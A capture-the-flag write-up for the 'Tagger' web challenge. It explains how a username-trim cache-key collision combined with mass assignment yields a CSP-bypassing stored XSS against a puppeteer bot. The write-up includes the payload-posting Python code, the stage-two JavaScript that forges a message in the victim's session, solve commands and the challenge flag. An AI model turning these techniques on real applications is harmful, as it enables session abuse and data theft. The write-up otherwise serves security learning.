# Tagger

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | web |
| Difficulty | grandpa |
| Author | Sagi |
| Points at close | 132 |
| Solves | 113 |
| Status | solved |

> Look at my new chat app, Tagger!!!

Files: [`challenge.zip`](handout/challenge.zip)

<details>
<summary><b>Solution</b></summary>

## The insight

The message-history cache is keyed by username and queried by user id, and the
two never have to agree:

```js
const messageHistoryKey = (userA, userB) => `${userA.trim()}:${userB.trim()}`;
```

The username regex is `/^[a-zA-Z0-9_ ]{3,32}$/`, so a space is a legal username
character and `.trim()` collapses `Hacker ` onto `Hacker`.

![register page with username validation shown](media/01-register-page.png)

Register `Hacker ` and
`FlagHolder ` with trailing spaces, befriend them, and open the chat. The entry
your request writes under `Hacker:FlagHolder` is the entry the bot's own browser
reads when it opens its own conversation with the real FlagHolder, so from that
moment the bot renders messages you wrote.

Everything else in this challenge is derivable from that one collision: what you
put in the poisoned entry has to run as script under a content security policy
that bans script elements, and the same collision is how you read the flag back
out afterwards.

![code showing cache key construction with trim and cache read by user id](media/03-cache-key-bug.png)

## Recon, in the order it ran

```bash
unzip -q handout/challenge.zip -d scratch/src
find scratch/src -type f -not -path '*/node_modules/*' | wc -l      # 48
grep -rn "helmet\|contentSecurityPolicy" scratch/src/app.js
grep -rn "router\.\(get\|post\)" scratch/src/routes/*.js
grep -rn "username" scratch/src/routes/auth.js
sed -n '1,120p' scratch/src/bot/index.js
grep -rn "messageHistoryKey\|getMessageHistory\|invalidateMessageHistory" \
     scratch/src/routes/messages.js
sed -n '1,90p' scratch/src/services/messageMarkup.js
```

The stack is Express 5, EJS, sqlite, and a puppeteer bot.

![the chat application interface showing a conversation](media/02-chat-app.png)

The first of those
greps prints the one thing that shapes every later decision, the content security
policy the application sets on every page it serves:

```
default-src 'self'; script-src 'self' 'unsafe-eval';
script-src-elem 'self'; script-src-attr 'unsafe-inline';
object-src 'none'; base-uri 'none'
```

Read one directive at a time and the payload writes itself. `script-src-elem
'self'` means an injected `<script src>` or an inline `<script>` block never runs,
while `script-src-attr 'unsafe-inline'` means an inline event handler does, so the
only script that can execute is script that arrives as the value of an attribute.
`default-src 'self'` allows a same-origin fetch and refuses everything else, so
any exfiltration to an outside collector has to be a navigation instead. That
combination decides the shape of the payload before a single byte of it is
written.

The route grep is short: `GET /chat`, `GET /chat/:friendId`, and
`POST /chat/:friendId/message`, with an upload path that is multer in memory,
image only, magic-byte checked, and stored as a data URI. The auth grep gives the
username regex.

The messages grep turns up two independent defects in the same file. The cache key
confusion is a write primitive into somebody else's rendered page. The mass
assignment in `messageRecord`, a few lines below it, is an HTML injection into
whatever page renders the message. The solve is the composition of the two.

![code showing mass assignment into message attributes and the CSP policy](media/04-markup-sink-and-csp.png)

## What the bot does

The bot runs on a 60 second cycle and does two things per cycle. `visitAsHacker`
logs in as `Hacker`, opens the conversation with `FlagHolder`, and waits 3
seconds, after which `replyAsFlagHolder` logs in as `FlagHolder` and posts
`process.env.FLAG` as an ordinary message, but only when the preview of the
Hacker conversation in its sidebar reads exactly `Give me the flag!`.

![bot code showing visitAsHacker and replyAsFlagHolder functions](media/05-bot-cycle.png)

The application does not write that message, so the flag is not sitting in
the database waiting to be read; it has to be provoked, and provoking it means
getting the string `Give me the flag!` into the Hacker side of that conversation
before the bot's second half of the cycle runs.

The first idea is to poison the preview directly, and it does not work, because
the sidebar preview comes from `getFriendsWithLatestMessage()`, a live database
query that never touches the cache, and the cache covers only the message pane. So
the poisoned entry can put arbitrary markup in front of the bot while the message
that triggers the reply still has to be posted by the bot itself, and that turns
cross-site scripting from one option among several into a requirement.

## Standing up the two colliding accounts

The setup is mechanical and `solve/solve.py` does it in one function, but two
parts of it are easy to get wrong. A suffix of one space may already be taken by
another team on a shared instance, so the script tries one, two, three, and four
spaces in turn and keeps the first pair that registers. And the friendship has to
exist before either account can open the conversation, so the request is sent one
way, accepted the other way, and then re-tried in the opposite direction when the
probe GET does not come back with a message pane:

```python
a.request_friend(bid); b.accept_all()
probe = a.chat(bid)
if probe.status_code != 200 or "message-panel" not in probe.text:
    b.request_friend(aid); a.accept_all()
    probe = a.chat(bid)
```

User ids come from `GET /discover?q=`, which renders one `<article
class="user-card">` per match with the numeric id embedded in the link target of
each card, so a single regex over that page is the entire lookup and no separate
API call is needed.

The cache entry lives for 60 seconds and the bot cycle is also 60 seconds, which
is tight enough that ownership of the key cannot be assumed. Both threads in the
exploit poll on a two-second interval for exactly that reason: whichever of us
last issued a GET owns the entry, and the poller has to be the last writer when
the bot arrives. Our chat and the bot's chat now read the same key.

![browser showing alice logged in reading bob's messages through key collision](media/06-cache-collision.png)

## Mass assignment into the markup renderer

`messageRecord` in `routes/messages.js` copies every attribute of the `Message`
model straight out of `req.body`, excluding four:

```js
const skip = new Set(["id", "fromUserId", "toUserId", "sentAt"]);
```

So `type`, `tagName`, `attributes`, and `content` are all attacker controlled on a
plain form POST. The `type` column is a sqlite `TEXT` enum, which means setting
`type=image` on the text branch works without a file upload, and
`services/messageMarkup.js` then emits:

```html
<img{attrs} class="message-image" src="{safeImageSource(content)}">
```

with `attrs` serialized from the JSON you supplied, under a filter that reads at
first like a dead end: an attribute name must match
`/^[a-z]+$/` and its value must match `/^[a-zA-Z0-9,. =]*$/`, which does not allow
parentheses or quotes of any kind. `onerror` is a legal name under that regex
and `script-src-attr 'unsafe-inline'` says the handler runs, so the only remaining
question is what can be expressed in a charset without call syntax.

## The charset, and the two-message payload

An assignment does not need parentheses, and `innerHTML` re-parses whatever string it
is given, so this is legal and sufficient:

```
X.innerHTML=X.textContent
```

`X` is an element id, resolved through the window named property because
`document.getElementById(...)` needs parentheses and cannot be written here. The
payload is therefore two messages posted in order:

```python
ident = "z" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
a.post_message(bid, tagName="p",
               attributes=json.dumps({"id": ident}),
               content="<img src=x onerror='" + stage_two_js + "'>")
a.post_message(bid, tagName="img", type="image",
               content="data:image/png;base64,QUJD",
               attributes=json.dumps(
                   {"onerror": f"{ident}.innerHTML={ident}.textContent"}))
```

The first message renders as `<p id="z...">` whose text is the escaped second
stage, and since `content` is escaped at the DOM text level rather than stripped,
`textContent` returns the markup raw. The second message renders as an image
whose source is `data:image/png;base64,QUJD`, a string that passes
`safeImageSource` and decodes to three bytes that are not a PNG, so Chrome fires
the error event and the handler runs. Assigning `innerHTML` from the paragraph's
own `textContent` re-parses that escaped markup in place, and the inner
`<img ... onerror='...'>` uses the full JavaScript charset because it reaches
the parser as markup instead of passing through the attribute filter.

Stage two runs in the bot's Hacker session, so it posts the trigger from inside
that session:

```js
await fetch(location.pathname + "/message", {
  method: "POST",
  headers: {"content-type": "application/x-www-form-urlencoded"},
  body: "message=Give+me+the+flag%21",
  redirect: "manual"});
```

Same origin, allowed by `default-src 'self'`, and `express.urlencoded` is mounted
ahead of the router so no multipart body is needed. The rendered markup from a
successful local run is recorded in `artifacts/hit-b.html`.

![network panel showing exploit request against local reproduction at 127.0.0.1:5000](media/07-exploit-request-net.png)

## Two details that decide whether the exploit works at all

Both look arbitrary in the finished script, so here is where each came from.

A hardcoded element id makes the exploit fire exactly once, because `X` resolves
through the window named property and that returns the element only while exactly
one element has the id. Re-running the exploit appends another `<p id="X">` to
the same conversation, at which point the named property is an `HTMLCollection`,
`X.textContent` is `undefined`, and `X.innerHTML = undefined` is a silent no-op
without an error or handler, and the rendered page shows what went wrong only
through absence. Run two would have failed while looking identical to run one, so
`solve/solve.py` picks `z` plus six random letters per run.

The read channel destroys the thing it is reading unless stage two guards itself.
Our second account polls `/chat/<Aid>`, which writes cache key
`FlagHolder:Hacker`, and the FlagHolder bot reads that same key, so it renders our
payload too. The local run confirmed it directly, with the collector logging one
hit from `/chat/2` and another from `/chat/1`, one per bot. Since stage two ends in
a navigation to the collector, on the FlagHolder bot it navigated the page away
between `page.goto(conversation.href)` and `page.type("#message-input", flag)`, so
the bot never typed the flag and the flag was never written to the database at
all. The fix is one line at the top of stage two:

```js
var t = document.querySelector(".chat-header h2");
if (!t || t.textContent.trim() != "FlagHolder") { return; }
```

A smaller one in the same family: `redirect: "manual"` on the stage-two fetch.
Following the 302 makes the bot's own GET refill `Hacker:FlagHolder` with the real
messages for a further 60 seconds, and since the bot's next visit is also 60
seconds away, the poisoned entry can lose that race and the payload skips a cycle.
With the redirect left unfollowed the key stays deleted and our two-second poller
owns it again immediately.

## Reading the flag back

Three channels exist and the exploit runs all of them, because the cheapest one is
not the one that has to work.

`replyAsFlagHolder` posts the flag through the composer form, which calls
`invalidateMessageHistory("FlagHolder", "Hacker")` and then redirects to
`GET /chat/<hackerId>`, and that redirected GET repopulates the key
`FlagHolder:Hacker` with the real messages, flag included, for a further 60
seconds, at which point our second account reading `/chat/<Aid>` hits the same key
and reads the flag without exfiltration. The XSS posts the magic string as Hacker, then FlagHolder replies with the flag on the next cycle. This is the channel
that won, both locally and on the live instance.

![browser showing the flag message in cache after bot replied](media/08-flag-in-cache.png)

Stage two also reads `document.documentElement.innerHTML` and regexes it for the
flag, which succeeds on the following cycle because by then the real Hacker
sidebar preview for FlagHolder is the flag itself, rendered from the live query.
And the collector navigation is kept as a third path. It fired during development
and was not needed for either win.

`solve/solve.py` runs the poisoner and the reader as two threads on a two-second
interval and stops at the first flag from either.

## Dead ends

The preview poison cost the most time. The first reading of the cache bug was that
it gives the flag outright: collide the key, wait a cycle, read the bot's
messages. That reading survives until you notice that the trigger message has to
exist before the flag does, and that the preview the bot consults is
`getFriendsWithLatestMessage()`, a live query rather than the cached pane. So the
cache bug is necessary and not sufficient, and script execution is mandatory
rather than a shortcut.

Reading the flag without script fails for the same reason. The flag only
exists once the bot has been made to post it, and the bot only posts it in
response to a message it can see in its own sidebar.

The obvious image sink is the upload path, which wastes time to pursue. The
implementation is multer in memory, restricted to images, and magic-byte checked,
and the stored value is a data URI. None of that is needed, because the `type` column is a sqlite
`TEXT` enum without a database-level constraint, so mass assignment reaches the
image rendering branch on a plain form POST without a file attached.

An empty `src` attribute as the error trigger is unreliable enough to be worth
replacing. A data URI that parses as a URI and fails as a PNG fires the error event
in every configuration tested.

A note on the harness rather than the challenge, recorded because it nearly
submitted a wrong answer. `solve/solve-b.py` had a fallback that, when the exploit
failed to produce a flag, grepped the shared collector log for anything flag-shaped. On
one run the instance was claimed before the application had finished booting, the
exploit failed, and the fallback matched a local test flag left in that log by an
earlier container run, then recorded it. A collector is shared across runs and
hosts and cannot say which target a line came from, so never read a flag out of
one. The fallback is deleted.

The other harness lesson concerns the three-instance team cap. A single-threaded
claim loop with a 25 second socket timeout stalled straight across the moment a
slot freed, so one stalled request was longer than the whole window.
`solve/spin_and_pwn.sh` and the claim front end now use several short-timeout
threads and sprint inside the window around the nearest expiry.

## Reproduce

```bash
docker build -t tagger-local scratch/src
docker rm -f tagger-local
docker run -d --name tagger-local -p 5000:5000 \
  -e FLAG='TFCCTF{LOCAL_ONLY_NOT_REAL_d4g}' tagger-local:latest
ctf-python solve/solve.py http://127.0.0.1:5000 \
  --catch <collector> --minutes 4 --artifacts artifacts
```

Two for two on a clean container, both wins inside two bot cycles, both through
the cache read channel.

![terminal showing successful local run with flag captured](media/09-exploit-run.png)

The remote run is the same script with the instance URL:

```bash
ctf-python solve/solve.py https://tagger-<hex>.challs.ctf.thefewchosen.com \
  --catch <collector> --minutes 4
```

The instance answers 301 on plain http and 200 on https, so use the https scheme
or the session cookie never sticks. `solve/solve-b.py` is the slot racer that
claims an instance and then execs `solve.py`; the payload lives in `solve.py`
alone. Logs from the winning remote run are in `artifacts/remote-run.log`.

<details>

![the flag displayed in the chat interface](media/10-flag.png)

Flag: `TFCCTF{Tagg3r_m15C0muN1cA710n}`

</details>

</details>
